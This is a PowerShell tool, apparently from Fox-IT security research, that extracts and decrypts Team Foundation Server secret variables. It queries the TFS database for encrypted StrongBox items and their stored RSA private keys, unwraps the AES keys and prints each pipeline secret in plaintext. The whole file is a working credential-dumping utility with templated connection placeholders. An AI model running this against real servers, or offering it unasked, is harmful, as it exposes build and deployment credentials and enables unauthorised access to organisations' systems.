
# Rindert Kramer
# Fox-IT
# Reference: 
#       https://lowleveldesign.org/2017/07/04/decrypting-tfs-secret-variables/
#       https://blog.fox-it.com/

function Get-_Help {

    $helpMsg = @"

    This tool can be used to decrypt TFS variables. 
    More information: https://blog.fox-it.com/

    Required parameters:
        databaseServer  : DatabaseServer. <localhost\SQLEXPRESS>
        database        : Name of the database. Defaults to Tfs_DefaultCollection
  
    Optional parameters:
        dbaUsername     : DBA Username
        dbaPassword     : DBA Password
        secret          : encrypted data
        cspBlob         : private key


    The tool will use integrated authentication, unless dbaUsername and dbaPassword are specified.
    To decrypt values manually, use the secret and cspblob parameters 

    Usage: ./Decrypt-TFSSecretVariables.ps1 -databaseServer <location>`r`n   
"@

    Write-Host $helpMsg
}

function Convert-HexToByteArray {

    # thx:
    # URL: https://www.reddit.com/r/PowerShell/comments/5rhjsy/hex_to_byte_array_and_back/

    [cmdletbinding()]

    param(
        [parameter(Mandatory=$true)]
        [String]
        $HexString
    )

    if ($HexString.StartsWith('0x')){
        $HexString = $HexString.Replace('0x',$null)
    }

    $Bytes = [byte[]]::new($HexString.Length / 2)

    For($i=0; $i -lt $HexString.Length; $i+=2){
        $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
    }

    $Bytes
}

function Decode-TFSSecret ($tfsKey) {
    
    # Convert key to byte array 
    $byteKey = $tfsKey

    # Calculate key length
    $keyLength = [bitconverter]::ToUInt32($byteKey[0..3],0)

    # Extract encrypted key based on key length    
    $aesKey = $byteKey[4..((4+$keyLength)-1)]
    
    # Calculate IV position and extract IV
    $ivLength = [bitconverter]::ToUInt32($byteKey[(4+$keyLength)..(8+$keyLength)],0)
    $ivStart  = 4+($keyLength)+4
    $ivend    = $ivStart + $ivLength
    $iv       = $byteKey[$ivStart..($ivend-1)]

    # Calculate position of the encrypted content 
    # and extract this value
    $ovallen = [bitconverter]::ToUInt64($byteKey[$ivend..($ivend+8)],0)
    $evallen = [bitconverter]::ToUInt64($byteKey[($ivend+8)..($ivend+16)],0)
    $evalStart = $ivend +16
    $evalEnd   = $ivend +16 + $evallen
    $encVal    = $byteKey[$evalStart..$evalEnd]

    return New-Object PSObject -Property @{
        'byteKey'          = $byteKey        
        'encryptedAesKey'  = $aesKey
        'iv'               = $iv
        'encryptedValue'   = $encVal
    }
}

function Find-TFSSecrets([string]$_databaseServer, [string]$_database, [string]$_userName = [string]::Empty, [string]$_password = [string]::Empty) {       

    # Build connectionstring based on parameter input
    $connectionString = [string]::Empty
    if ([string]::IsNullOrEmpty($userName)) {
        $connectionString = "Server=$databaseServer;Database=$database;Integrated Security=True;"
    } else {
        $connectionString = "Server=$databaseServer;uid=$userName;pwd=$password;Database=$database;Integrated Security=False;"
    }

    $connection  = New-Object System.Data.SqlClient.SqlConnection
    $command     = New-Object System.Data.SqlClient.SqlCommand
    $resultTable = New-Object System.Data.DataTable
    $tfsSecrets  = New-Object System.Collections.ArrayList

    try {
        $connection.ConnectionString = $connectionString
        $connection.Open()
        
        # Query to extract secrets and their matching private keys
        $query = 'select tbl_StrongBoxItem.EncryptedContent, tbl_StrongBoxItem.LookupKey, tbl_SigningKey.PrivateKey 
                  from tbl_StrongBoxItem, tbl_SigningKey 
                  where tbl_StrongBoxItem.SigningKeyId = tbl_SigningKey.id;'

        $command.Connection  = $connection                
        $command.CommandText = $query                 
        $resultTable.Load($command.ExecuteReader())

        if ($resultTable.rows.Count -le 0) {
            Write-Error 'No TFS secrets found. Check script parameters.'
        } else {
            $i = 0
            $maxCount = $resultTable.rows.Count
            foreach ($r in $resultTable.rows) {
                $tmp = New-Object PSObject -Property @{
                    'encryptedContent'  = $r.EncryptedContent
                    'privateKey'        = $r.PrivateKey         
                    'LookupKey'         = $r.LookupKey           
                }

                [void]$tfsSecrets.Add($tmp)

                $i++
                #Write-Progress -PercentComplete ($i / $maxCount *100) -Activity 'Extracting TFS secrets from database...'
            }

            return $tfsSecrets
        }
    }

    catch {
        throw 'Unable to extract TFS secrets. Check script settings.'
    }

    finally {

        # cleanup
        $connection.Dispose()
        $command.Dispose()
        $resultTable.Dispose()
    }
}

function Decrypt-TFSPassword([byte[]]$aesKey, [byte[]]$iv, [byte[]]$encryptedValue) {

    $password  = [string]::Empty

    $aes       = New-Object ([System.Security.Cryptography.Aes]::Create())
    $transform = $aes.CreateDecryptor($aesKey, $iv)
    $encryptedStream = New-Object System.IO.MemoryStream(,$encryptedValue)
    $cryptoStream    = New-Object System.Security.Cryptography.CryptoStream($encryptedStream, `
                                                                            $transform, `
                                                                            ([System.Security.Cryptography.CryptoStreamMode]::Read))
    $decryptedStream = New-Object System.IO.MemoryStream
    $cryptoStream.CopyTo($decryptedStream)

    $password = [System.Text.Encoding]::UTF8.GetString($decryptedStream.ToArray())

    # cleanup
    $decryptedStream.Close()
    $cryptoStream.Close()
    $aes.Dispose()
    $encryptedStream.Dispose()
    $cryptoStream.Dispose()
    $decryptedStream.Dispose()

    return $password
}

function Decrypt-AESKey([byte[]]$cspBlob, [byte[]]$encryptedAESKey) {

    $cspParameter = New-Object System.Security.Cryptography.CspParameters
    $cspParameter.Flags = [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore
    $rsaCryptoServiceProvider = New-Object System.Security.Cryptography.RSACryptoServiceProvider(2048, $cspParameter)
    
    $rsaCryptoServiceProvider.ImportCspBlob($cspBlob)        
    [byte[]]$aesKey = $rsaCryptoServiceProvider.Decrypt($encryptedAESKey, $true)

    # cleanup
    $rsaCryptoServiceProvider.Dispose()
    Remove-Variable cspParameter             -ErrorAction SilentlyContinue
    Remove-Variable rsaCryptoServiceProvider -ErrorAction SilentlyContinue

    return $aesKey
}


[string]$databaseServer = '__db_server__'
[string]$database = '__database__'
[string]$dbaUsername = '__dba_username__'
[string]$dbaPassword = '__dba_password__'


if ([string]::IsNullOrEmpty($databaseServer) -and [string]::IsNullOrEmpty($cspBlob)){
    Get-_Help
    return
}

if (-not [string]::IsNullOrEmpty($databaseServer)){

    # Retrieve secrets from database
    $tfsSecrets = Find-TFSSecrets -_databaseServer $databaseServer -_database $database -_userName $dbaUsername -_password $dbaPassword

    if ($tfsSecrets.Count -le 0) {
        return
    }

    $passwords = @()
    $maxCount  = $tfsSecrets.Count

    for ($c = 0; $c -lt $maxCount; $c++) {
        
        $secret = $tfsSecrets[$c]
        $encryptedContent = $tfsSecrets[$c].encryptedContent
        $privateKey       = $tfsSecrets[$c].privateKey
        $lookupKey        = $tfsSecrets[$c].LookupKey

        # Get variable name
        $varName = [string]::Empty
        if ($lookupKey.Contains('/')){
            $varName = $lookupKey.Split('/')[-1]
        } else {
            $varName = $lookupKey 
        }

        # Decode secret
        $decodedKey = Decode-TFSSecret -tfsKey $encryptedContent    

        # Decrypt AESkey
        [byte[]]$aesKey = Decrypt-AESKey -cspBlob $privateKey -encryptedAESKey $decodedKey.encryptedAesKey

        # Decrypt password with AESkey
        $password = Decrypt-TFSPassword -aesKey $aesKey -iv $decodedKey.iv -encryptedValue $decodedKey.encryptedValue
        <#$passwords += New-Object PSObject -Property @{
            'VariableName'   = $varName
            'DecryptedValue' = $password
        }#>

        $passwords += "[*]$varName [+]$password"
        #Write-Progress -Activity 'Decrypting passwords' -PercentComplete ($c / $maxCount *100)        
    }

    
    $passwords    
}

# Manual decryption
if (-not [string]::IsNullOrEmpty($cspBlob)){
    
    [byte[]]$byteSecret  = Convert-HexToByteArray $secret
    [byte[]]$byteCspBlob = Convert-HexToByteArray $cspBlob

    # Decode secret    
    $decodedKey = Decode-TFSSecret -tfsKey $byteSecret

    # Decrypt AESkey
    [byte[]]$aesKey = Decrypt-AESKey -cspBlob $byteCspBlob -encryptedAESKey $decodedKey.encryptedAesKey

    # Decrypt password with AESkey
    $password = Decrypt-TFSPassword -aesKey $aesKey -iv $decodedKey.iv -encryptedValue $decodedKey.encryptedValue

    Write-Host "[+] $password" -ForegroundColor Green
}
